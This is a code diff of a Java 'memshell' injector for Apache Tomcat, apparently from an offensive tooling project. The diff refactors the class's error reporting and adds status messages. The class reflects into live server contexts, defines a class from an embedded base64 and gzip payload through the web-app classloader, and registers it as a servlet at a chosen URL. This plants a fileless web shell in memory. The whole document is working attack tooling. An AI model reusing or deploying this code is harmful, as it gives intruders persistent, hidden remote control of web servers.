@@ -3,11 +3,15 @@ package com.reajason.javaweb.memshell.injector.tomcat;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.*;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -16,17 +20,7 @@ import java.util.zip.GZIPInputStream;
  */
 public class TomcatServletInjector {
 
-    public TomcatServletInjector() {
-        try {
-            List<Object> contexts = getContext();
-            for (Object context : contexts) {
-                Object servlet = getShell(context);
-                inject(context, servlet);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+    private String msg = "";
 
     public String getClassName() {
         return "{{className}}";
@@ -38,6 +32,45 @@ public class TomcatServletInjector {
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
+    }
+
+    public TomcatServletInjector() {
+        List<Object> contexts = null;
+        try {
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts != null) {
+            for (Object context : contexts) {
+                msg += ("context: [" + getContextRoot(context) + "] ");
+                try {
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public List<Object> getContext() throws Exception {
@@ -68,24 +101,24 @@ public class TomcatServletInjector {
         }
     }
 
-    @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
+        ClassLoader classLoader = getWebAppClassLoader(context);
+        Class<?> clazz = null;
         try {
-            return webAppClassLoader.loadClass(getClassName()).newInstance();
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
-            return clazz.newInstance();
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
 
     @SuppressWarnings("all")
     public void inject(Object context, Object servlet) throws Exception {
         if (invokeMethod(context, "findServletMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
-            System.out.println("servlet already injected");
             return;
         }
         ClassLoader contextClassLoader = context.getClass().getClassLoader();
@@ -104,7 +137,11 @@ public class TomcatServletInjector {
             invokeMethod(context, "addServletMappingDecoded", new Class[]{String.class, String.class, Boolean.TYPE}, new Object[]{getUrlPattern(), getClassName(), false});
         }
         support56Inject(context, wrapper);
-        System.out.println("servlet inject success");
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     private void support56Inject(Object context, Object wrapper) throws Exception {
@@ -235,6 +272,21 @@ public class TomcatServletInjector {
             return method.invoke(obj instanceof Class ? null : obj, param);
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
+        }
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
         }
     }
 }
